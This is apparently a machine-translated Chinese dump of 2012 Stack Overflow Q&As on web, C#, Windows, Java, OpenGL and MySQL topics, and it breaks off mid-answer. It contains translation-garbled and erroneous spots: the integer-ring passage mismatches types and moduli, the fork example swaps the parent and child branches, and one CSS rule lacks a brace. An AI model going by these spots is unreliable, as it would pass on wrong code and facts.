嗨，我正在尝试做一些 Jquery 表单逻辑，这取决于从先前选择的单选按钮中选择了哪个值，或者根据对它的更改……本质上会发生以下情况。

```
 if(selectedRadioButton == '2mL')
  {

    // do some logic here 
```

这就是我在我看来用两个选项声明我的收音机表格的方式......

```
<div class="row">
    <?php echo $form->labelEx($model, 'oneml_twoml'); ?>

        <div class="compactRadioGroup">
        <?php
            echo $form->radioButtonList($model, 'oneml_twoml',
                array(  '1mL' => '1mL',
                        '2mL' => '2mL'
                         ) );
        ?>

        </div>
        <?php echo $form->error($model, 'oneml_twoml'); ?>
</div> 
```

使用 Jquery，如何从我的单选按钮选项中提取所选值以用于执行逻辑？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-07T15:26:55.660

想出了如何做到这一点...

```
var one_two_ml = $('input:radio[name=ModelName[oneml_twoml]]:checked').val(); 
```

而随后

```
 if (one_two_ml == '2mL')
  {
    var net_output = some_variable + 5;  

   $('#ModelName_net_output').val(net_output); 
  } 
```

# php - Opencart - 我如何在产品页面上执行自定义代码？控制器产品上没有模组

> ID：11847785
> 
> 赞同：1
> 
> 时间：2012-08-07T14:07:13.817
> 
> 标签：php, module, opencart

我正在为 OpenCart 开发自定义 Mod。

我想在客户通过链接打开产品页面时填充它。

我不想触摸 MVC 控制器等 - 我可以只进行 Ajax 调用或在视图中执行 PHP 吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-07T22:24:19.710

是的，你可以在不触及 MVC 模式的情况下做到这一点；虽然它更好并建议留在 MVC 方法中（尽管快速破解有时是更好的解决方案）

* * *

1 - 打开 \catalog\view\theme\default\template\product.tpl

2 - 查找`<?php echo $footer; ?>`

3 - 在此之前放置您的代码；默认情况下，已经在 header.tpl 中调用了 jQuery

* * *

示例代码：（你可以很容易地让你的表`slideDown`等等。

```
<script type="text/javascript">
/**
* jQUERY
**/
$(document).ready(function(){
    //////////////////
    //####  SHOW CART ON CLICK
    //////////////////
    $('.cart-expand').click(function() {
            $('#cart-hidden').slideDown();
    });
    //////////////////
    //####  EXPORT AN AJAX PHP BUILD FROM MVC
    //////////////////
    <?
    $AddressofCustomerId=$this->customer->getAddressId();
    CurrentCustomerZone($AddressofCustomerId);
    ?>
});
/**
* JAVASCRIPT
**/
alert('Normal JavaScript free from jQuery');
</script> 
```

您甚至可以在 .tpl 文件中使用普通 PHP，并在 tpl 中调用数据库函数，尽管不推荐。

# extjs4.1 - 如何更改 extjs4 中的 fieldLabel 样式

> ID：11847788
> 
> 赞同：0
> 
> 时间：2012-08-07T14:07:29.873
> 
> 标签：extjs4.1

我想知道是否有任何方法可以更改 extjs4.1.0 中整个面板或整个项目的字段标签的字体颜色、字体大小和字体系列。（例如，我有一些 10 个带有 10 个表单面板的 js 文件。我想更改字段标签样式，而不更改每个js。有什么方法可以实现吗？？？）谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-07T14:27:57.763

[fieldlabel 的 css 类](http://docs.sencha.com/ext-js/4-1/#!/api/Ext.form.Labelable-cfg-labelCls)是“x-form-item-label”。

您可以为此类创建自己的 css 样式，例如，在`<head>`index.html 中包含以下内容：

```
<style type="text/css">
    .x-form-item-label
        color: red !important;
    }
</style> 
```

只要确保它出现在包含 ext css 文件之后。

# c# - 将 int 转换为 short 会产生意想不到的结果

> ID：11847791
> 
> 赞同：19
> 
> 时间：2012-08-07T14:07:38.030
> 
> 标签：c#, casting

我对 C# 中数字类型的丢失信息有点困惑。

当我这样做时：

```
int x = 32780;
short y = (short)x; 
```

我得到了结果：y 为 -32756 而不是预期的 32767。为什么？这是如何计算的？

short 范围：-32768 到 32767 int 范围：-2,147,483,648 到 2,147,483,647

* * *

## 回答 #1

> 赞同：53
> 
> 时间：2012-08-07T14:12:48.393

您似乎期待的是“四舍五入”效果，而不是实际发生的情况，这是对数据的按位重新解释。

在二进制中，`x`等于`00000000000000001000000000001100`，它是一个只有 16 个有效位的 32 位数字。A`short`是一个 16 位有*符号*整数，使用[二进制补码表示法表示](http://en.wikipedia.org/wiki/Two%27s_complement)。

当您转换时，您的最后 16 位将`x`被复制`y`到`1000000000001100`. 重要的是，第一个数字是`1`. 在二进制补码表示法中，这是`-32756`. 你的数字没有被四舍五入——它被认为是 16 位的。

* * *

## 回答 #2

> 赞同：14
> 
> 时间：2012-08-07T14:12:43.820

阅读 Dan 的回答，了解发生这种情况的“真实”原因，但这样想就足够了：当一个数字超出其最大值时，它会循环回到最小值。所以，`32780 - 32767 = 13`和`-32768 (which is one of the 13) + 12 (the other 12) = -32756`

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2012-08-07T16:45:08.000

可以说，运行时添加或减去`65536`所需的次数是为了获得`short`( `System.Int16`) 类型范围内的数字。

如果你知道很多纯数学，而不是通过内部二进制表示来解释它（这也很酷），你可以从[模块化算术](http://en.wikipedia.org/wiki/Modular_arithmetic)中理解它。

为此，将类型视为`short`模 65536 的整数，也写为 ℤ/65536ℤ。ℤ/65536ℤ 的每个成员都是一个*同余类*，即一组数字在除以 65536 时都具有相同的余数。现在，每个同余类都有无数不同的成员（“代表”）。如果你选择一个，你可以通过重复加减 65536 得到所有其他的。

使用`short`数据类型，我们选择区间中的唯一代表`-32768`到`+32767`. 那么`ushort`也是一样的，只是我们在`0`through中挑选代表`65535`。

现在关于 ℤ/65536ℤ 很酷的一点是它形成了一个[环](http://en.wikipedia.org/wiki/Ring_(mathematics))，其中我们有**加法**、**减法**和**乘法**（但**没有**除法）。实际上，在`unchecked`上下文中，使用`short x,y;`C# 操作

```
(short)(x + y)
(short)(x - y)
(short)(x * y) 
```

完全对应ℤ/65536ℤ中的算术。（我们必须回到`short`这里，因为从技术上讲，C# 只为`int`、`uint`、`long`和定义了运算符`ulong`。）

同理，`sbyte`and`byte`可以被认为是环ℤ/256ℤ，ℤ/4294967296ℤ，and`int`是ℤ/18446744073709551615ℤ。`uint``long``ulong`

但是请注意，因为这些模不是素数，所以在环中不能进行除法。例如，`int X`不满足

```
unchecked( 10 * X == 35 )   // integers Int32 
```

因此不清楚`35/10`应该是什么。另一方面，**两个** `X`满足

```
unchecked( 10 * X == 36 )   // integers Int32 
```

但他们中的哪一个应该是`36/10`？

然而，正是一个`int X`使

```
unchecked( 11 * X == 35 )   // integers Int32 
```

真的。我们很幸运，因为 11 与 4294967296 相对质数。解`X`是 1952257865（自己检查），所以商`35/11`在某种意义上就是这个数字`X`。

结论：C#的整数运算`+`, `-`, 和`*`可以简单地解释为ℤ/nℤ中的环运算。但`/`操作与戒指没有任何关系！

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2012-08-07T14:17:31.767

当您将 x 转换为 short 时，您将得到一个溢出（即分配的值超出了它可以处理的范围）并且您的值将被表示为认为它会从最小值开始重新开始。正如你所说，short 的最大值是 32767，所以你的新值是：-32768 + (32780 - 32768) = -32756

根据编程语言（可能还有您的编译器），您尝试执行的操作可能会带来异常或不带来异常。在 C# 中似乎没有。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2012-08-07T14:15:53.057

有溢出。如果您希望将数字限制为最大值，您可以通过将整数与 进行比较来解决此问题`short.MaxValue`：

```
short y;
if (x > short.MaxValue) {
    y = short.MaxValue;
} else if (x < short.MinValue) {
    y = short.MinValue;
} else {
    y = (short)x;
} 
```

# winapi - TCP SOCKET 句柄是否可继承？

> ID：11847793
> 
> 赞同：7
> 
> 时间：2012-08-07T14:07:50.703
> 
> 标签：winapi, winsock

在 Windows 上，大多数类型的句柄都可以被子进程继承。期望 TCP 套接字也可以被继承。但是，当安装了某些分层服务提供程序时，它不会按预期工作（赛门铁克的 PCTools 等 A/V 产品曾经导致我们为客户的应用程序出现问题）。

微软构建 WinSock 的方式，我们是否应该期望能够正确继承 SOCKET？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-08-09T18:30:44.600

## 简短的回答

不，不应将 SOCKET 标记为可继承。安装某些分层服务提供程序 (LSP) 后，继承的句柄根本无法在子级中使用。

作为一个额外的刺激，请参阅相关问题[“可以将 TCP SOCKETS 标记为不可继承吗？”](https://stackoverflow.com/questions/12058911) . 简而言之，您不能依赖能够继承套接字，但也不能阻止套接字被继承！

## 解释

遗憾的是，这违背了微软自己的一些示例和文档（例如[KB150523](http://support.microsoft.com/kb/150523)）。简而言之，分层服务提供程序是 Microsoft 为第三方软件提供的一种方式，可以将自己插入到您的应用程序和 Microsoft 的 WinSock DLL 中的 TCP/UDP 堆栈之间。由于一些 LSP 的工作方式，它们使得在进程之间传输套接字变得困难，因为 LSP 将一些本地信息与它需要存在的每个套接字相关联。

LSP 只能挂接到 WinSock 函数；例如，`DuplicateHandle`当安装了某些 LSP 时，调用 SOCKET 将不起作用，因为它是句柄级函数，并且 LSP 永远没有机会复制它需要的信息。`DuplicateHandle` [（这在文档](http://msdn.microsoft.com/en-us/library/windows/desktop/ms724251(v=vs.85).aspx)中简要但清楚地说明了）。

类似地，尝试将 SOCKET 句柄设置为可继承将在不通知 LSP 的情况下复制句柄，结果相同：Winsock 在子进程中可能无法识别重复的句柄。典型的错误是 WSAENOTSOCK（10038，“非套接字上的套接字操作”），甚至是 ERROR_INVALID_HANDLE（6，“句柄无效”）。

## 例子

假设您要编写一个 Windows 程序，该程序使用重定向的 stdin 和 stdout 启动子进程，向其发送一些数据，在子进程的标准输入上发出 EOF 信号，以便它知道处理数据，然后等待子进程返回。

让我们进一步假设执行了某种富有想象力的启动形式，这意味着您的孩子可能根本不是孩子（例如，gksu/runas 启动必须立即退出的包装器，只留下与客户端）。因此，您无需等待孩子的 PID。

行为将与此类似：

```
int main(int argc, char* argv[]) {
  int handles[2];
  socketpair(AF_UNIX, SOCK_STREAM, 0, handles);
  if (fork()) {
    // child
    close(handles[0]);
    dup2(handles[1], 0);
    dup2(handles[1], 1);
    execl("clever-app", "clever-app", (char*)0);
  }

  // parent
  close(handles[1]);
  char* data[100];
  write(handles[0], data, sizeof(data)); // should at least check for EINTR...

  // tell the app we called there's nothing more to read from stdin: 
  shutdown(handles[0], SHUT_WR);

  // wait until child has exited (discarding all output)
  while (read(handles[0], data, sizeof(data)) >= 0) ;

  // now continue with the rest of the program...
} 
```

## 解决方法

在没有分层服务提供者的机器上，创建一对连接的 TCP 套接字，并在子级中继承一个作为标准输入/标准输出，确实表现正确。很容易将其用作`socketpair`Windows 上行为的解决方法（记得发送随机数！）。

可悲的是，SOCKET 根本无法可靠地继承。要在 Windows 上编写具有几乎相同功能的东西，您需要使用命名管道。在调用之前`CreateProcess`，使用`CreateNamedPipe`/`ConnectNamedPipe`和朋友创建一对连接的 HANDLES（`GetOverlappedResult`对于重叠的父句柄）。（孩子的句柄，用作标准输入，不能重叠！）孩子的句柄可以设置为可继承，孩子将通过它正常通信。

当您完成向客户端传输数据后，调用父句柄上的`FlushFileBuffers`和。`CloseHandle`

### 进一步的问题

1.  在继续之前等待孩子退出怎么样，只使用手柄？没有办法直接用管道直接做到这一点。Windows 管道不能半封闭。方法：

    1.  （Unix方式，扭曲以适应Windows）制作另一对连接的虚拟句柄，并在子进程中继承其中一个，但不要告诉孩子它（不要将它作为std句柄附加）。然后，您可以等待父级中的第二个句柄来检测子级何时退出。
    2.  （Windows-y 方式）一个正确的痛苦，但相当强大：使用命名管道获取父级中子级的实际进程句柄。这是 Windows 上等待孩子退出的“正确”方式。（这实际上是你在 Unix 上做不到的；只有进程的父进程才能直接等待进程退出；`OpenProcess`将 pid 转换为句柄，所以如果你在`OpenProcess`调用，你可以摆脱在 Unix 上无法实现的竞争条件。）使用这样的进程句柄仍然是一个正确的痛苦，因为你可能会发现你需要第二个命名管道连接来发送它，具体取决于关于如何编写 runas 包装器。
2.  一个陷阱：孩子如何收到父母已完成对其标准输入的写入的通知？如果父母试图打电话`DisconnectClient`，孩子不会得到正常的EOF。根据您要执行的操作，这可能是个问题。当父级关闭 SOCKET 时，您会得到`feof`，但如果句柄连接到子级的标准输入，则子级将收到读取错误，而不会向其发出 EOF 信号。这可能会导致子进程无法以与正常连接到标准输入的方式完全相同的方式工作。在父级中调用 CloseHandle 会在子级中提供正确的行为。

# java - Spring Batch 可以多次使用Driving Query 的结果吗？

> ID：11847796
> 
> 赞同：1
> 
> 时间：2012-08-07T14:07:57.533
> 
> 标签：java, spring-batch

我有一个需要实施的批处理过程。我的客户首选的批处理框架是 Spring Batch。

逻辑过程是

1.  从已知状态的数据库中选择一组记录
2.  将记录写入文件
3.  更新已写入文件的记录状态

该过程可能会触及大量记录，并且我希望尽可能缩短更新事务，因此我的预期设计是

1.  使用驱动查询模式生成候选行列表
2.  迭代第 1 步的结果，将它们写入输出文件
3.  开始交易
4.  再次迭代第 1 步的结果，更新数据库中行的状态
5.  结束交易

我打算使用现有的数据访问层来完成数据库工作，而不是使用 spring JdbcCursorItemReader。

这是 Spring Batch 可以轻松应对的事情，还是我需要再考虑一下？

提前致谢

戴夫

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-09T22:29:58.257

实际上，这在[Common Batch Patterns](http://static.springsource.org/spring-batch/reference/html/patterns.html)文档中有所描述；您可以阅读第**11.4 节驱动基于查询的 ItemReaders**

通过使用具有文件输出编写器和数据库更新逻辑的[CompositeItemWriter](http://static.springsource.org/spring-batch/apidocs/org/springframework/batch/item/support/CompositeItemWriter.html)以及从第一步获取输入的处理器，您可以模拟所需的行为。

希望这会有所帮助

# android - 带有alpha的android opengl es drawarray

> ID：11847800
> 
> 赞同：0
> 
> 时间：2012-08-07T14:08:05.827
> 
> 标签：android, opengl-es, alpha, alphablending

我喜欢用 OpenGL ES 1.0 函数“drawArray”绘制一个矩形，在这个矩形上我想用 alpha 绘制一个纹理。（一个 Hud 元素和 drawArray 矩形显示该元素的“填充状态”）。

基本上它可以工作，但是我在 drawArray 矩形上绘制的带有 alpha 的纹理受矩形颜色的影响。drawArray 绘制一个蓝色矩形，并且绘制后的纹理也显示为蓝色。

这里我正在使用的功能：

**已解决——请参阅“开始解决方案”**

```
private void bagFillState(GL10 gl) {
    // fill state background
    gl.glMatrixMode(GL10.GL_MODELVIEW);
    gl.glLoadIdentity();
    gl.glPushMatrix();
    gl.glScalef(0.25f, 0.25f, 0f);
    gl.glTranslatef(0.0f, 3.0f, 0f);

    gl.glDisable(GL10.GL_TEXTURE_2D);

    // Draw background
    gl.glVertexPointer(2, GL10.GL_FLOAT, 0, _vertsGUIFillBuffer);
    gl.glEnableClientState(GL10.GL_VERTEX_ARRAY);
    gl.glColorPointer(4, GL10.GL_FLOAT, 0, _colorGUIFillBuffer);
    gl.glEnableClientState(GL10.GL_COLOR_ARRAY);
    gl.glDrawArrays(GL10.GL_TRIANGLE_STRIP, 0, 4);

    // START SOLUTION - Add the following Line
    gl.glDisableClientState(GL10.GL_COLOR_ARRAY);
    // END SOLTUTION

    gl.glEnable(GL10.GL_TEXTURE_2D);

    gl.glPopMatrix();
    gl.glLoadIdentity();        
} 
```

在其上绘制纹理的方法：

```
private void bagChoosing(GL10 gl) {
    // HUD
    gl.glMatrixMode(GL10.GL_MODELVIEW);
    gl.glLoadIdentity();
    gl.glPushMatrix();
    gl.glScalef(0.25f, 1.0f, 1f);
    gl.glTranslatef(0.0f, 0.0f, 0f);

    gl.glMatrixMode(GL10.GL_TEXTURE);
    gl.glLoadIdentity();

    _gui.draw(gl);
    gl.glPopMatrix();
    gl.glLoadIdentity();
}

public void onDrawFrame(GL10 gl) {
    gl.glClear(GL10.GL_COLOR_BUFFER_BIT | GL10.GL_DEPTH_BUFFER_BIT | GL10.GL_STENCIL_BUFFER_BIT);

    background1(gl);

    movePlayer1(gl);
    bagFillState(gl);
    bagChoosing(gl);

    // All other game drawing will be called here
    gl.glEnable(GL10.GL_BLEND);
    gl.glBlendFunc(GL10.GL_SRC_ALPHA, GL10.GL_ONE_MINUS_SRC_ALPHA);
} 
```

在加载纹理或使用“drawArray”绘图时我需要做些什么特别的事情，所以 drawArray 矩形不会影响纹理颜色？感谢您提供任何提示或链接。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-07T18:04:26.200

您是否在绘制纹理之前重置了颜色指针，或者禁用了 GL_COLOR_ARRAY 客户端状态？

听起来您的蓝色仍然处于启用状态，它正在调制采样纹理。

如果这不能回答您的问题，请提供纹理的完整绘图代码，并链接到问题的图像。

# c++ - C++ - 使用托管在 azure 中的 C# REST-full WCF 服务

> ID：11847803
> 
> 赞同：0
> 
> 时间：2012-08-07T14:08:11.887
> 
> 标签：c++, wcf, rest, azure

我在 Azure 上运行 ac# WCF REST 服务。我需要从非托管应用程序中使用和长轮询服务。

c++ 应用程序不会在 .NET 框架上运行。

是否有最佳实践或库可以使 C++ 使用 WCF 服务变得容易？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-07T14:43:45.750

微软正在为这个用例开发他们的 Casablanca 库。您可以在这里获得它的开发预览版本：http: [//msdn.microsoft.com/en-us/devlabs/casablanca.aspx](http://msdn.microsoft.com/en-us/devlabs/casablanca.aspx)

或者，在工作中，我们通常会编写一个使用 WCF 服务的 C# 组件，并通过 COM 将服务的对象公开给 C++。我们最近在[KDSOAP](http://www.kdab.com/kdab-products/kd-soap/)方面也取得了一些成功，这意味着将 Qt 引入您的项目。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-25T18:45:33.777

您可以尝试使用 gSOAP，它是一个众所周知的用于 SOAP Web 服务和基于 XML 的应用程序的工具包，它是用 c 和 c++ 编写的，用于：创建和使用 Web 服务。它支持许多 W3C 标准，也可以使用 WCF。您可以在 gsoap2.sourceforge.net 中找到它最好的问候

# windows - Windows 7 远程桌面连接保存凭据不起作用

> ID：11847805
> 
> 赞同：32
> 
> 时间：2012-08-07T14:08:12.913
> 
> 标签：windows, desktop

尝试通过远程桌面连接从 Windows 7 连接到远程 Windows 2008 服务器

在登录过程中，我总是被要求提供凭据——即使我保存了我的凭据

这个错误会蔓延

您的系统管理员不允许使用已保存的凭据登录到远程计算机计算机名/IP 地址，因为它的身份没有得到完全验证。请输入新凭据。登录尝试失败

连接来自不同域的 2 台计算机时没有信任关系。在这种情况下，Windows 使用 NTLM，并且默认域计算机策略不允许使用保存的凭据。

* * *

## 回答 #1

> 赞同：70
> 
> 时间：2012-08-08T05:44:29.690

**尝试以下步骤：**

1.  在本地计算机上打开 Windows 命令提示符类型：gpedit.msc -> 按 Enter -> 将弹出一个新窗口
2.  转到本地计算机策略 -> 计算机配置 -> 管理模板 -> 系统 -> 凭据委派
3.  双击“允许使用仅 NTLM 服务器身份验证委派保存的凭据”</li>
4.  默认为“未配置”</li>
5.  您将看到单选按钮 -> 启用策略
6.  单击下面选项窗口中的“显示”按钮，然后在列表中输入值“TERMSRV/*”（不带引号）。
7.  单击应用按钮
8.  对以下策略执行相同的操作：
    允许委派保存的凭据
    允许使用仅 NTLM 服务器身份验证
    委派默认凭据 允许委派默认凭据

9.  确保“**拒绝**委派保存的凭据”未启用或列表中不包含“TERMSRV/*”

10.  关闭所有窗口

11.  打开命令提示符并使用“gpupdate /force”命令直接应用策略。

# javascript - Javascript Date - 只设置日期，忽略时间？

> ID：11847806
> 
> 赞同：43
> 
> 时间：2012-08-07T14:08:16.587
> 
> 标签：javascript, date

我有一堆对象，每个对象都有一个时间戳，我想按日期将它们分组到一个 JSON 对象中。最终目标是这样的：

```
myObject = {
    "06/07/2012" : [ 
        {
            "timestamp" : "07/06/2012 13:30",
            ...
        },
        {
            "timestamp" : "07/06/2012 14:00",
            ...
        }
    ],
    "07/07/2012 [...]
} 
```

为了获取日期，我正在测试每个*时间戳*对象并使用：

```
var visitDate = new Date(parseInt(item.timestamp, 10));
visitDate.setHours(0);
visitDate.setMinutes(0);
visitDate.setSeconds(0); 
```

..然后我用它来存储 JSON 对象的名称。它看起来很乱，我相信应该有一种更简单的做事方式。

欢迎建议/建议！

* * *

## 回答 #1

> 赞同：77
> 
> 时间：2012-08-07T14:11:16.300

怎么样[`.toDateString()`](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/Date/toDateString)？

或者，使用`.getDate()`,`.getMonth()`和`.getYear()`?

在我看来，如果你想按日期对事物进行分组，你只是想访问日期，而不是设置它。通过设置访问日期字段的方式，您可以比较它们并将它们组合在一起，不是吗？

在此处查看所有有趣的 Date 方法：[MDN Docs](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/Date#Methods)

* * *

编辑：如果*要将*其保留为日期对象，请执行以下操作：

```
var newDate = new Date(oldDate.toDateString()); 
```

Date 的构造函数在解析字符串方面非常聪明（尽管并非没有大量警告，但这应该可以非常一致地工作），因此使用旧的 Date 并将其打印到没有任何时间的日期将产生与您在原帖。

* * *

## 回答 #2

> 赞同：11
> 
> 时间：2012-08-07T14:16:32.387

如果您不介意创建额外的日期对象，您可以尝试：

```
var tempDate = new Date(parseInt(item.timestamp, 10));
var visitDate = new Date (tempDate.getUTCFullYear(), tempDate.getUTCMonth(), tempDate.getUTCDate()); 
```

我做了一些非常相似的事情来获得没有时间的当月日期。

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2020-08-05T23:46:25.497

```
var today = new Date();
var year = today.getFullYear();
var mes = today.getMonth()+1;
var dia = today.getDate();
var fecha =dia+"-"+mes+"-"+year;
console.log(fecha);
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2020-12-24T03:15:08.237

```
let date = new Date((new Date("07/06/2012 13:30")).toDateString())
console.log(date)
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2022-01-18T15:11:40.593

**只需将本地日期字符串通过“/”拆分为数组并相应地排列它们，非常简单。**

```
var date=new Date();
var datearray=date.toLocaleString().split("/");
var sqldate= datearray[2].slice(0,4)+"-"+(datearray[0]<=9?"0"+datearray[0]:datearray[0])+"-"+(datearray[1]<=9?"0"+datearray[1]:datearray[1]); 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2021-12-08T15:46:21.380

日期处理不可避免地很棘手。首先，如果您将日期时间作为 UTC ISO 字符串（“yyyy-MM-dd hh:mm:ss.000Z”）发送，将会省去很多麻烦。如果您将日期存储为字符串，请将它们存储为 ISO 字符串。用斜杠解析日期取决于语言环境，因此容易出错。（欧洲人把天放在首位，美国人把月放在首位。）

要从日期时间 ISO 字符串中获取日期字符串，请使用`myDatetimeString.substring(0,10)`. 要从日期字符串中获取日期对象，只需添加零...

```
myUtcMidnightDateObject = new Date( myDateString + ' 00:00:00Z' ) 
```

要格式化您的 UTC 午夜日期对象，请使用`toLocaleString()`UTC 选项...

```
myFormattedDate = myUtcMidnightDateObject.toLocaleDateString({},{ timeZone: "UTC" }) 
```

更多细节可以在[这里](https://stackoverflow.com/a/38050824/1585345)找到。

# php - modrewrite 不加载我的 CSS 和图像

> ID：11847810
> 
> 赞同：-1
> 
> 时间：2012-08-07T14:08:28.537
> 
> 标签：php, apache, .htaccess

我的网站上有一个重写规则。它转换此链接：

[http://www.qblza.com.br/anuncio_detalhes.php?ida=232&title=samsung-duos-camera-2-mp-redes-sociais-2-chips-bluetooth.html](http://www.qblza.com.br/anuncio_detalhes.php?ida=232&title=samsung-duos-camera-2-mp-redes-sociais-2-chips-bluetooth.html)

进入这个：

[http://www.qblza.com.br/232/samsung-duos-camera-2-mp-redes-sociais-2-chips-bluetooth.html](http://www.qblza.com.br/232/samsung-duos-camera-2-mp-redes-sociais-2-chips-bluetooth.html)

这是我正在使用的重写规则：

```
RewriteEngine On
RewriteRule ^([^/]*)/([^/]*)\.html$ /anuncio_detalhes.php?ida=$1&title=$2 [L] 
```

问题是当用户点击重写 url 时，该站点不会加载任何 CSS 和图像......它只是加载文本......我不知道为什么会这样。

任何帮助，将不胜感激！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-07T14:15:57.847

在您的样式表、图像上，如果您有 javascript 源。在位置前输入“/”。

图片：

`<img src="/file/to/path/image.jpg" />`

样式表：

```
<link ref="stylesheet" href="/file/to/path/style.css" /> 
```

Javascript：

```
<script src="/file/to/path/javascript.js" /> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-07T14:20:37.113

问题是您正在为静态资源使用相对路径。因此，当加载重写 URL 时，浏览器会在头部看到：

```
<link id="menu-color" type="text/css" rel="stylesheet" href="css/menu-gray.css"> 
```

并尝试加载

[http://www.qblza.com.br/232/samsung-duos-camera-2-mp-redes-sociais-2-chips-bluetooth.html/css/menu-gray.css](http://www.qblza.com.br/232/samsung-duos-camera-2-mp-redes-sociais-2-chips-bluetooth.html/css/menu-gray.css)

解决方案 1：使用绝对路径加载静态资源：

```
<link rel="stylesheet" type="text/css" href="/css/menu-gray.css" /> 
```

所以你的浏览器肯定会遵循 domain-root 的路径

解决方案 2：使用 base-tag

```
<base href="http://your-domain.com" /> 
```

有了这个，你告诉浏览器在跟随路径时使用哪个根目录（还有图像等）

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-07T14:16:43.443

如果没有看到 html，我会说最可能的问题是图像和 css 的 url。当您像您一样重写您的网址时，您需要使用绝对网址（相对于站点根目录）。

# c# - 在 JavaScript 中编译/解释 Razor 视图

> ID：11847813
> 
> 赞同：0
> 
> 时间：2012-08-07T14:08:36.130
> 
> 标签：c#, javascript, asp.net, asp.net-mvc, razor

我正在使用 ASP.NET MVC 4，想知道是否有办法将 Razor 视图编译成 JavaScript？这意味着我想用 JavaScript 创建 HTML！这将允许控制器根据请求使用 HTML 或 JSON 进行响应，从而使我能够最小化带宽和 CPU 要求，同时更快地为每个客户端提供页面。是否有这样的编译选项（我想在编译成 JavaScript 之前实际运行 HTML 助手），或者是否有用于 Razor 语法的 JavaScript 解释器？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-05T13:43:33.547

目前有一个名为[`RazorClientTemplates`](https://github.com/jchadwick/RazorClientTemplates)将 Razor 视图编译为 JavaScript 的项目。

我在带有 Backbone 的 MVC 3 项目中使用它——它可以工作，但对代码块和 HTML 帮助程序的支持非常有限。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-07T14:35:52.557

没有办法在 JavaScript 中使用 Razor 本身，但是有几个 JavaScript 模板和 MVVM 引擎。

看一眼：

*   [Handlebars](http://handlebarsjs.com/)（大多数 MVVM 引擎基于的模板引擎）
*   [淘汰赛JS](http://knockoutjs.com/)
*   [EmberJS](http://emberjs.com/)

不幸的是，这比仅重用 Razor 模板要复杂得多。

# extjs - 为列表 itemTpl 中 div 内的跨度动态更改 css

> ID：11847814
> 
> 赞同：1
> 
> 时间：2012-08-07T14:08:38.900
> 
> 标签：extjs, sencha-touch-2

这是我坚持的事情：

```
Ext.define('Application.view.phone.AppScreen', {
extend: 'Ext.navigation.View',
//  extend: 'Ext.Container',
xtype: 'appscreen',
id: 'appscreen',
alias: 'widget.appscreen',
config: {

    items: [{
        xtype: 'container',
        title: 'My View',
        layout: {
            type: 'fit'
        },
        items:[{
            html:'phone'
        },

        {
            xtype:'list',
            id:'AccountSummary',
            name:'AccountSummary',
            onItemDisclosure:true,
            store:{
                fields: ['Label', 'Amount'],
                data: [
                {
                    "Label":"Order",
                    "Amount": "18,275"
                },

                {
                    "Label":"Shipment",
                    "Amount": "25,255"
                },

                {
                    "Label":"Invoices",
                    "Amount": "11,125"
                }
                ]
            }, 

        itemTpl: new Ext.XTemplate('{Label}<tpl if="Label==Order"><div class="meter"><span style="width: 60%"></span></div></tpl><tpl if="Label==Shipment"><div class="meter1"><span style="width: 60%"></span></div></tpl><br>$ {Amount} Cash')

        }]
    }]
} 
```

});

我需要动态更改 css，例如如果标签是 order 我需要应用 css 仪表，类似于 Shipment 的仪表 1。有人可以帮我吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-08T17:21:47.647

这应该相当简单，看看下面我的工作 TPL 示例：

```
new Ext.Container({
    fullscreen : true,
    tpl        : '<tpl if="foo == &quot;bar&quot;">Is Bar</tpl>',
    data       : {
        foo : 'bar'
    }
}); 
```

我认为您只需要在您的语句中添加编码引号，因为您检查了一个字符串，请参阅下面的更新代码：

```
itemTpl: new Ext.XTemplate('{Label}<tpl if="Label == &quot;Order&quot;"><div class="meter"><span style="width: 60%"></span></div></tpl><tpl if="Label == &quot;Shipment&quot;"><div class="meter1"><span style="width: 60%"></span></div></tpl><br>$ {Amount} Cash') 
```

# mysql - 错误：指定的密钥太长；最大密钥长度为 1000 字节

> ID：11847815
> 
> 赞同：21
> 
> 时间：2012-08-07T14:08:47.987
> 
> 标签：mysql

错误：

> 1071 - 指定的密钥太长；最大密钥长度为 1000 字节

```
CREATE TABLE `phppos_modules_actions` (
  `action_id` VARCHAR( 255 ) CHARACTER SET utf8 COLLATE utf8_unicode_ci NOT NULL ,
  `module_id` VARCHAR( 255 ) CHARACTER SET utf8 COLLATE utf8_unicode_ci NOT NULL ,
  `action_name_key` VARCHAR( 255 ) CHARACTER SET utf8 COLLATE utf8_unicode_ci NOT NULL ,
  `sort` INT NOT NULL ,
  PRIMARY KEY ( `action_id` , `module_id` )
) ENGINE = INNODB CHARACTER SET utf8 COLLATE utf8_unicode_ci; 
```

我知道发生错误是因为 255x2x3（每个字符 3 个字节）

并非所有安装都会发生这种情况。我可以更改什么设置？

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2016-03-18T17:39:47.543

## NO_ENGINE_SUBSTITUTION 禁用且 INNODB 未激活，这是一个错误的组合

*   在 MySql 5.5 之前，sqlmode 默认为空字符串，这意味着默认情况下未设置 sqlmode NO_ENGINE_SUBSTITUTION

根据 MySql 文档（参见[https://dev.mysql.com/doc/refman/5.6/en/sql-mode.html#sqlmode_no_engine_substitution](https://dev.mysql.com/doc/refman/5.6/en/sql-mode.html#sqlmode_no_engine_substitution)），这是 sqlmode NO_ENGINE_SUBSTITUTION 的含义：

